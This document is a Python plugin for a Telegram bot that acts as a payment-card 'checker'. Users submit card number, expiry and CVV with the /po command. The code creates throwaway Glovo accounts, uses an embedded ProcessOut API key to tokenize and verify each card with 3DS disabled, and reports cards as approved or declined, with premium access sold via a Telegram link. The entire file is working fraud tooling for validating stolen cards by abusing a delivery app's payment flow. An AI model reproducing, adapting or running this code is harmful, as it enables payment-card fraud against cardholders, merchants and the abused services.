"""
ProcessOut Gateway Plugin (via Glovo)
Commands: /po, .po, !po, $po
"""

import requests
import json
import time
import random
import asyncio
from pyrogram import Client, filters
from pyrogram.enums import ParseMode

import sys
sys.path.append('..')
from utils.card_utils import extract_card_info, format_card_display
from utils.bin_lookup import get_bin_info
from utils.response_formatter import get_response_keyboard

# Plugin metadata
PLUGIN_INFO = {
    'name': 'ProcessOut',
    'commands': ['po'],
    'prefixes': ['.', '/', '!', '$'],
    'description': 'ProcessOut payment gateway via Glovo',
    'type': 'auth',
    'status': 'active'
}

def ln(size):
    """Generate random hex string"""
    numbes = '0123456789abcdef'
    return ''.join(random.choice(numbes) for _ in range(size))

def get_str(separa, inicia, fim, contador=1):
    """Extract string between delimiters"""
    try:
        nada = separa.split(inicia)
        nada = nada[contador].split(fim)
        return nada[0]
    except:
        return ""

def categorize_processout_response(response_data, pay_text):
    """
    Categorize ProcessOut response
    Returns: ('approved', 'declined', or '3ds', 'response_message')
    """
    # Check for success first
    if '"verification_status":"success"' in pay_text or '"verification_status":"succes' in pay_text:
        return 'approved', 'Approved'
    
    # Get error info
    error_type = response_data.get('error_type', '')
    message = response_data.get('message', '')
    
    # Determine which to use as response
    if message == "OK: check http status":
        response_text = error_type
    else:
        response_text = message or error_type or "Unknown error"
    
    # Check for 3DS/authentication keywords
    auth_keywords = ['authentication', 'authorization', '3ds']
    if any(keyword.lower() in response_text.lower() for keyword in auth_keywords):
        return '3ds', response_text
    
    # Check for approval keywords (but not success - that's handled above)
    approval_keywords = ['cvv', 'cvc', 'insufficient', 'avs', 'card.exceeded-limits', 
                        'zip', 'address', 'name']
    # Exclude card.missing-cvc as it's a decline
    if any(keyword.lower() in response_text.lower() for keyword in approval_keywords) and \
       'card.missing-cvc' not in response_text.lower():
        return 'approved', response_text
    
    # Everything else is declined
    return 'declined', response_text

def get_status_emoji(category):
    """Get emoji for status category"""
    emoji_map = {
        'approved': '𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅',
        'declined': '𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌',
        '3ds': '𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ❎'
    }
    return emoji_map.get(category, '𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌')

def format_processout_response(card_info, response_message, bin_info, execution_time, category):
    """Format ProcessOut response for Telegram"""
    card, month, year, cvv = card_info
    cc_display = f"`{card}|{month}|{year}|{cvv}`"
    
    status_text = get_status_emoji(category)
    
    response_text = f"{status_text}\n\n"
    response_text += f"㊕ 𝗖𝗖 ⇾ {cc_display}\n"
    response_text += f"㊕ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ ProcessOut\n"
    response_text += f"㊕ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response_message}\n\n"
    
    # Add BIN info if available
    if bin_info:
        response_text += f"㊕ 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('vendor', 'N/A')} - {bin_info.get('type', 'N/A')} - {bin_info.get('level', 'N/A')}\n"
        response_text += f"㊕ 𝗕𝗮𝗻𝗸: {bin_info.get('bank_name', 'N/A')}\n"
        response_text += f"㊕ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'N/A')} {bin_info.get('flag', '')}\n\n"
    
    response_text += f"㊕ 𝗧𝗼𝗼𝗸 {execution_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀"
    
    return response_text

class ProcessOutGateway:
    def __init__(self):
        self.session = requests.Session()
        self.email_suffix = random.randint(11111, 99999)
        self.sessionid = ln(12)
        
    def create_account(self):
        """Step 1: Create Glovo account"""
        url = 'https://api.glovoapp.com/v3/users/customer'
        headers = {
            'content-type': 'application/json; charset=UTF-8',
            'glovo-api-version': '14',
            'glovo-app-development-state': 'Production',
            'glovo-app-platform': 'Android',
            'glovo-app-type': 'customer',
            'glovo-app-version': '5.180.0',
            'glovo-current-location-accuracy': '1.0',
            'glovo-current-location-latitude': '-10.94142',
            'glovo-current-location-longitude': '-51.75133',
            'glovo-current-location-timestamp': '1662705334000',
            'glovo-delivery-location-accuracy': '0.0',
            'glovo-delivery-location-latitude': '40.2022974',
            'glovo-delivery-location-longitude': '-8.4343859',
            'glovo-delivery-location-timestamp': '1662685967010',
            'glovo-device-id': f'11166{self.email_suffix}',
            'glovo-dynamic-session-id': f'65e08a50-3ca9-4adb-91a0-{self.sessionid}',
            'glovo-language-code': 'pt',
            'glovo-location-city-code': 'COI',
            'host': 'api.glovoapp.com',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }
        
        payload = {
            "password": "suasenha123",
            "privacySettings": ["DATA_POLICY"],
            "email": f"vanrouger{self.email_suffix}@gmail.com",
            "name": "kushu silvas",
            "deviceUrn": f"glv:device:de700488-ba1d-48c0-8313-{self.sessionid}",
            "type": "Customer",
            "os": "Android",
            "preferredCityCode": "COI",
            "preferredLanguage": "pt"
        }
        
        try:
            response = self.session.post(url, headers=headers, json=payload, timeout=30, verify=False)
            # Don't check status code - just continue if we get any response
            return True
        except Exception as e:
            print(f"Account creation error: {e}")
            return False
    
    def login(self):
        """Step 2: Login to get token"""
        url = 'https://api.glovoapp.com/oauth/token'
        headers = {
            'content-type': 'application/json; charset=UTF-8',
            'glovo-api-version': '14',
            'glovo-app-development-state': 'Production',
            'glovo-app-platform': 'Android',
            'glovo-app-type': 'customer',
            'glovo-app-version': '5.180.0',
            'glovo-current-location-accuracy': '1.0',
            'glovo-current-location-latitude': '-10.94142',
            'glovo-current-location-longitude': '-51.75133',
            'glovo-current-location-timestamp': '1662705334000',
            'glovo-delivery-location-accuracy': '0.0',
            'glovo-delivery-location-latitude': '40.2022974',
            'glovo-delivery-location-longitude': '-8.4343859',
            'glovo-delivery-location-timestamp': '1662685967010',
            'glovo-device-id': f'11166{self.email_suffix}',
            'glovo-dynamic-session-id': f'65e08a50-3ca9-4adb-91a0-{self.sessionid}',
            'glovo-language-code': 'pt',
            'glovo-location-city-code': 'COI',
            'host': 'api.glovoapp.com',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }
        
        payload = {
            "password": "suasenha123",
            "username": f"vanrouger{self.email_suffix}@gmail.com",
            "grantType": "password"
        }
        
        try:
            response = self.session.post(url, headers=headers, json=payload, timeout=30, verify=False)
            login_data = response.text
            token = get_str(login_data, '"accessToken":"', '"', 1)
            return token if token else None
        except Exception as e:
            print(f"Login error: {e}")
            return None
    
    def tokenize_card(self, card, month, year, cvv):
        """Step 3: Tokenize card with ProcessOut"""
        url = 'https://api.processout.com/cards'
        headers = {
            'authorization': 'Basic cHJval9VU1Z0WUptOEFNVkxueHlpQnpXWHIxUno1S3dkclJtUzo=',
            'content-type': 'application/json; charset=utf-8',
            'host': 'api.processout.com',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }
        
        payload = {
            "name": "kushu silva",
            "number": card,
            "contact": {"country_code": "BR"},
            "cvc": cvv,
            "exp_month": int(month),
            "exp_year": int(year),
            "device": {
                "app_timezone_offset": 180,
                "app_screen_width": 720,
                "app_language": "pt",
                "app_screen_height": 1280
            }
        }
        
        try:
            response = self.session.post(url, headers=headers, json=payload, timeout=30, verify=False)
            pay_data = response.text
            cardid = get_str(pay_data, '","id":"', '"', 1)
            return cardid if cardid else None
        except Exception as e:
            print(f"Card tokenization error: {e}")
            return None
    
    def get_payment_platform_token(self, token):
        """Step 4: Get payment platform token"""
        url = 'https://api.glovoapp.com/v3/customer/payment_platform_card/tokens'
        headers = {
            'authorization': token,
            'content-type': 'application/json; charset=UTF-8',
            'glovo-api-version': '14',
            'glovo-app-development-state': 'Production',
            'glovo-app-platform': 'Android',
            'glovo-app-type': 'customer',
            'glovo-app-version': '5.180.0',
            'glovo-current-location-accuracy': '1.0',
            'glovo-current-location-latitude': '-10.94142',
            'glovo-current-location-longitude': '-51.75133',
            'glovo-current-location-timestamp': '1662705334000',
            'glovo-delivery-location-accuracy': '0.0',
            'glovo-delivery-location-latitude': '40.2022974',
            'glovo-delivery-location-longitude': '-8.4343859',
            'glovo-delivery-location-timestamp': '1662683803028',
            'glovo-device-id': f'11166{self.email_suffix}',
            'glovo-dynamic-session-id': f'65e08a50-3ca9-4adb-91a0-{self.sessionid}',
            'glovo-language-code': 'pt',
            'glovo-location-city-code': 'COI',
            'host': 'api.glovoapp.com',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }
        
        payload = {
            "paymentProvider": "ProcessOut"
        }
        
        try:
            response = self.session.post(url, headers=headers, json=payload, timeout=30, verify=False)
            pay_data = response.text
            platform_customer_id = get_str(pay_data, '"platformCustomerId":"', '"', 1)
            platform_token = get_str(pay_data, '"platformToken":"', '"', 1)
            
            if platform_customer_id and platform_token:
                return platform_customer_id, platform_token
            return None, None
        except Exception as e:
            print(f"Payment platform token error: {e}")
            return None, None
    
    def verify_card(self, cardid, platform_customer_id, platform_token):
        """Step 5: Verify card and get final response"""
        url = f'https://api.processout.com/customers/{platform_customer_id}/tokens/{platform_token}'
        headers = {
            'authorization': 'Basic cHJval9VU1Z0WUptOEFNVkxueHlpQnpXWHIxUno1S3dkclJtUzo=',
            'content-type': 'application/json; charset=utf-8',
            'host': 'api.processout.com',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }
        
        payload = {
            "enable_three_d_s_2": False,
            "source": cardid,
            "verify": False,
            "device": {
                "app_timezone_offset": 180,
                "app_screen_width": 720,
                "app_language": "pt",
                "app_screen_height": 1280
            }
        }
        
        try:
            response = self.session.put(url, headers=headers, json=payload, timeout=30, verify=False)
            return response.text
        except Exception as e:
            print(f"Card verification error: {e}")
            return None
    
    async def check_card(self, card, month, year, cvv):
        """Main function to check card through ProcessOut"""
        start_time = time.time()
        
        try:
            # Step 1: Create account
            if not self.create_account():
                return None, "Failed to create account", time.time() - start_time
            
            # Step 2: Login
            token = self.login()
            if not token:
                return None, "Failed to login", time.time() - start_time
            
            # Step 3: Tokenize card
            cardid = self.tokenize_card(card, month, year, cvv)
            if not cardid:
                return None, "Failed to tokenize card", time.time() - start_time
            
            # Step 4: Get payment platform token
            platform_customer_id, platform_token = self.get_payment_platform_token(token)
            if not platform_customer_id or not platform_token:
                return None, "Failed to get payment platform token", time.time() - start_time
            
            # Step 5: Verify card
            pay_response = self.verify_card(cardid, platform_customer_id, platform_token)
            if not pay_response:
                return None, "Failed to verify card", time.time() - start_time
            
            execution_time = time.time() - start_time
            return pay_response, None, execution_time
            
        except Exception as e:
            execution_time = time.time() - start_time
            return None, f"Error: {str(e)}", execution_time

# Register command handlers
def setup(app: Client):
    """Setup function called when plugin is loaded"""
    
    @app.on_message(filters.command(["po"], prefixes=[".", "/", "!", "$"]))
    async def po_command(client, message):
        """Handle /po command"""
        from utils.admin import check_banned, check_maintenance, check_gateway_access, forward_to_admin_if_enabled
        from utils.database import db
        
        user_id = message.from_user.id
        username = message.from_user.username
        
        # Add user to database
        db.add_user(user_id, username)
        
        # Check if banned
        if await check_banned(client, message):
            return
        
        # Check if maintenance
        if await check_maintenance(client, message):
            return
        
        # Check gateway access
        can_access, reason = await check_gateway_access(user_id, 'po')
        if not can_access:
            if reason == "locked":
                return
            elif reason == "premium":
                from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
                keyboard = InlineKeyboardMarkup([[
                    InlineKeyboardButton("Buy", url="https://t.me/themigel")
                ]])
                await message.reply_text(
                    "<b>Only available to Premium users !</b>",
                    parse_mode=ParseMode.HTML,
                    reply_markup=keyboard
                )
                return
        
        # Extract card info from message or reply
        text = None
        if message.reply_to_message:
            text = message.reply_to_message.text
        elif message.text:
            command_text = message.text.strip()
            command_parts = command_text.split(maxsplit=1)
            if len(command_parts) > 1:
                text = command_parts[1]
        
        if not text:
            resp = f"""〈<a href='tg://user?id={user_id}'>꫟</a>〉-» 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙊𝙪𝙩 - AUTH

〈♻️〉𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» ProcessOut

<a href='tg://user?id={user_id}'>╰┈➤</a> 𝙁𝙤𝙧𝙢𝙖𝙩 -» /po cc|month|year|cvc"""
            await message.reply_text(resp, parse_mode=ParseMode.HTML)
            return
        
        # Extract card info
        card_info = extract_card_info(text)
        if not card_info:
            await message.reply_text("❌ Invalid card format. Use: cc|month|year|cvv")
            return
        
        # Validate card with Luhn algorithm
        from utils.gateway_middleware import validate_card_with_luhn
        if not await validate_card_with_luhn(card_info, "ProcessOut", message):
            return
        
        card, month, year, cvv = card_info
        
        # Forward to admin if enabled
        await forward_to_admin_if_enabled(client, message, 'po')
        
        # Send progress message
        progress_msg = await message.reply_text("𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩...")
        
        # Process the card
        gateway = ProcessOutGateway()
        pay_response, error, execution_time = await gateway.check_card(card, month, year, cvv)
        
        # Increment check counter
        db.increment_check(user_id, 'po')
        
        # Get BIN info
        bin_info = get_bin_info(card)
        
        if error:
            # Error occurred
            response_text = format_processout_response(
                card_info=(card, month, year, cvv),
                response_message=error,
                bin_info=bin_info,
                execution_time=execution_time,
                category='declined'
            )
        else:
            # Parse response
            try:
                response_data = json.loads(pay_response)
            except:
                response_data = {}
            
            # Categorize and format
            category, response_message = categorize_processout_response(response_data, pay_response)
            
            response_text = format_processout_response(
                card_info=(card, month, year, cvv),
                response_message=response_message,
                bin_info=bin_info,
                execution_time=execution_time,
                category=category
            )
        
        # Update progress message with result
        keyboard = get_response_keyboard()
        await progress_msg.edit_text(
            response_text,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=keyboard
        )
    
    print("✅ ProcessOut gateway commands registered")

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)